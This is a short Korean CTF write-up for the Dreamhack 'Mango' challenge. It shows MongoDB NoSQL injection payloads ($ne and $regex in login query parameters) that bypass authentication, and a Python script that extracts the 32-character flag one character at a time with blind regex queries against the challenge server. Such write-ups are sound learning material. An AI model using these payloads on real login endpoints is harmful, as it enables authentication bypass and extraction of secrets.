### Mango

- MongoDB에서는 쿼리에서 Regex를 이용, 아래와 같은 형식이 허용됨

```js
{ "uid": { "$regex": ".*" } }
```

```bash
/login?uid[$ne]=guest&upw[$regex]=.*
```

- 이를 이용해서 우회

```bash
/login?uid[$regex]=^ad.in&upw[$regex]=^D.{[a-zA-Z0-9]{32}}
```

- 문제는 우회만 해서는 안되고, DH{32}의 flag를 알아내야함, 그래서 파이썬 코드로 Sovle

```python
import requests
import string

char = []
char = list(string.digits) + list(string.ascii_lowercase) + list(string.ascii_uppercase)

url = "http://host1.dreamhack.games:16132/login?uid[$regex]=.{5}&upw[$regex]=.{2}"
flag = "\{"

for i in range(32):
    for j in range(len(char)):
        print(url + flag + char[j] + ".{"+str(31-i)+"}" + "\}")
        response = requests.get(url + flag + char[j] + ".{"+str(31-i)+"}"+"\}")
        print(response.text)
        if 'admin' in response.text:
            flag+=char[j]
            break

print(flag+"}")
```
